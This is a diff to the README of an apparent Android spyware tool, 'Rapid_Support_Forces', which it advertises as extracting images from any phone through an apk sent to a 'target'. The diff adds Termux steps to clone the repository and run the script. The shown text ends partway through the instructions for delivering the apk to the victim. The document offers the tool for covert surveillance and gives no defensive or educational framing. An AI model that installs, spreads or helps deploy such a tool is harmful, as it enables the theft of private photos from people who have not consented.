@@ -1,7 +1,5 @@
 # Rapid_Support_Forces
 
-ترجم هذا النص الي العربية
-
 Tool Rapid_Support_Forces ❤️
 ----
 The best tool to extract images from any Android phone by linking it to a special apk application.
@@ -12,6 +10,19 @@ How to install it on Termux ☠
 Copy these commands in order to Termux!
 !!!
 ----
+
+```
+git clone https://github.com/Aladdin-sd/Rapid_Support_Forces
+```
+```
+cd Rapid_Support_Forces
+```
+```
+chmod +x Rapid_Support_Forces.py
+```
+```
+python3 Rapid_Support_Forces.py
+```
 How to run the tool after installing it on Termux: -
 
 Click on the link to download the apk application that you will send to the target
